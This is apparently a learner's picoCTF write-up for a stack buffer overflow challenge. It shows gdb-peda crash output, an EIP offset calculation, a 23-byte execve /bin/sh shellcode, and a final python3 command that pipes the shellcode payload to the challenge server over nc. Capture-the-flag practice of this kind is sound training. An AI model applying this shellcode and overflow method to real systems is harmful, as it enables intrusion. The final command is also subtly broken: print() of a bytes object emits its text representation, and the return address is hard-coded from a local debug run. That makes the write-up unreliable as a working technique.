# buffer overflow 0
> challenge description: Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. And connect with it using: nc saturn.picoctf.net 53935

> category: binary exploitaiton; by: Alex Fulton / Palash Oswal

*i attempted to do it without the source code since its basic buffer overflow*

given a: binary file, its source code (C)

## running the binary

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/buffer_overflow_0]
└──╼ $./vuln 
Please create 'flag.txt' in this directory with your own debugging flag.
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/buffer_overflow_0]
└──╼ $echo 'fakeflag' > flag.txt
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/buffer_overflow_0]
└──╼ $./vuln 
Input: test
The program will exit now
```
debug the program: $gdb vuln

find out the amount of bytes needed to overwrite the EIP. read up about EIP and stuff to know why.

```assembly
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/user/ctfs/picoCTF/binary_exploitation/buffer_overflow_0/vuln 
Input: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd020 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EBX: 0x41412d41 ('A-AA')
ECX: 0xffffd110 ("AwAAZAAxAAyA")
EDX: 0xffffd0dc ("AwAAZAAxAAyA")
ESI: 0xf7fa7000 --> 0x1e4d6c 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x44414128 ('(AAD')
ESP: 0xffffd040 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x413b4141 ('AA;A')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x413b4141
[------------------------------------stack-------------------------------------]
0000| 0xffffd040 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffd044 ("EAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffd048 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffd04c ("AFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffd050 ("bAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffd054 ("AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffd058 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffd05c ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x413b4141 in ?? ()
```

find the offset that would overwrite the EIP with:

```console
gdb-peda$ pattern offset 0x413b4141
1094402369 found at offset: 28
```

find the amount of NOP sled needed to... like... make sure to have some kind of space? cause the address in gdb debugger might be a little off.

```assembly
gdb-peda$ run 
Starting program: /home/user/ctfs/picoCTF/binary_exploitation/buffer_overflow_0/vuln 
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd020 ('A' <repeats 200 times>)
EBX: 0x41414141 ('AAAA')
ECX: 0xffffd110 ('A' <repeats 12 times>)
EDX: 0xffffd0dc ('A' <repeats 12 times>)
ESI: 0xf7fa7000 --> 0x1e4d6c 
EDI: 0xf7fa7000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd040 ('A' <repeats 168 times>)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd040 ('A' <repeats 168 times>)
0004| 0xffffd044 ('A' <repeats 164 times>)
0008| 0xffffd048 ('A' <repeats 160 times>)
0012| 0xffffd04c ('A' <repeats 156 times>)
0016| 0xffffd050 ('A' <repeats 152 times>)
0020| 0xffffd054 ('A' <repeats 148 times>)
0024| 0xffffd058 ('A' <repeats 144 times>)
0028| 0xffffd05c ('A' <repeats 140 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()

gdb-peda$ x/100xg $esp
0xffffd040:	0x4141414141414141	0x4141414141414141
0xffffd050:	0x4141414141414141	0x4141414141414141
0xffffd060:	0x4141414141414141	0x4141414141414141
0xffffd070:	0x4141414141414141	0x4141414141414141
0xffffd080:	0x4141414141414141	0x4141414141414141
0xffffd090:	0x4141414141414141	0x4141414141414141
0xffffd0a0:	0x4141414141414141	0x4141414141414141
0xffffd0b0:	0x4141414141414141	0x4141414141414141
0xffffd0c0:	0x4141414141414141	0x4141414141414141
0xffffd0d0:	0x4141414141414141	0x4141414141414141
0xffffd0e0:	0x4141414141414141	0x4141414141414100
0xffffd0f0:	0x4141414141414141	0x4141414141414141
0xffffd100:	0x4141414141414141	0x4141414141414141
0xffffd110:	0x4141414141414141	0xf7fa700041414141
0xffffd120:	0x91cd76b500000000	0x00000000d27748a5
0xffffd130:	0x0000000000000000	0x0000000000000000
0xffffd140:	0x0000000000000000	0x56558facf7fe30d9
0xffffd150:	0x565561d000000001	0x5655620500000000
0xffffd160:	0x0000000156556382	0x565564a0ffffd184
0xffffd170:	0xf7fe323056556510	0x0000001cffffd17c
0xffffd180:	0xffffd33100000001	0xffffd37400000000
0xffffd190:	0xffffd3d4ffffd384	0xffffd3f9ffffd3e6
0xffffd1a0:	0xffffd447ffffd40d	0xffffd472ffffd45e
0xffffd1b0:	0xffffd4bcffffd49b	0xffffd4e7ffffd4d4
0xffffd1c0:	0xffffd512ffffd503	0xffffd57fffffd53d
0xffffd1d0:	0xffffd5b1ffffd5a4	0xffffd5faffffd5c6
0xffffd1e0:	0xffffd630ffffd60e	0xffffd669ffffd660
0xffffd1f0:	0xffffd68effffd679	0xffffdc8effffd69f
0xffffd200:	0xffffdcb3ffffdca7	0xffffdcf8ffffdcc4
0xffffd210:	0xffffdd2dffffdd0f	0xffffdd59ffffdd41
0xffffd220:	0xffffdd6effffdd63	0xffffdd8fffffdd76
0xffffd230:	0xffffddb5ffffddaa	0xffffdde5ffffddc6
0xffffd240:	0xffffde17ffffddf9	0xffffdf1bffffde53
0xffffd250:	0xffffdf6dffffdf37	0xffffdf96ffffdf7f
0xffffd260:	0x0000002000000000	0x00000021f7fd0550
0xffffd270:	0x00000033f7fd0000	0x00000010000006f0
0xffffd280:	0x00000006178bfbff	0x0000001100001000
0xffffd290:	0x0000000300000064	0x0000000456555034
0xffffd2a0:	0x0000000500000020	0x000000070000000c
0xffffd2b0:	0x00000008f7fd2000	0x0000000900000000
0xffffd2c0:	0x0000000b565561d0	0x0000000c000003e8
0xffffd2d0:	0x0000000d000003e8	0x0000000e000003ec
0xffffd2e0:	0x00000017000003ec	0x0000001900000000
0xffffd2f0:	0x0000001affffd31b	0x0000001f00000002
0xffffd300:	0x0000000fffffdfb5	0x00000000ffffd32b
0xffffd310:	0x0000000000000000	0x5bebcfec75000000
0xffffd320:	0xe7a015e6f5a53736	0x0036383669dbe3aa
0xffffd330:	0x752f656d6f682f00	0x736674632f726573
0xffffd340:	0x4654436f6369702f	0x5f7972616e69622f
0xffffd350:	0x6174696f6c707865	0x6675622f6e6f6974

gdb-peda$ p/d 0xffffd100 - 0xffffd050
$2 = 176
```

before calculating the NOP sled, get a shellcode first and get the length:

what i used (23 bytes):

`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

## NOP + shellcode + padding + a buffer address

total bytes needed to overwrite EIP = 28

shellcode byte = 23

28 - 23 = 5

NOP sled + padding = 5

payload = "\x90" * 2 + <insert shellcode here> + padding * 3 + address from the middle of the buffer (not important to get the exact buffer as NOP sled is used)

```console
┌─[user@parrot]─[~/ctfs/picoCTF/binary_exploitation/buffer_overflow_0]
└──╼ $python3 -c 'print(b"\x90" * 2 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A" * 3 + b"\xa0\xd0\xff\xff")' | nc saturn.picoctf.net 53935
```


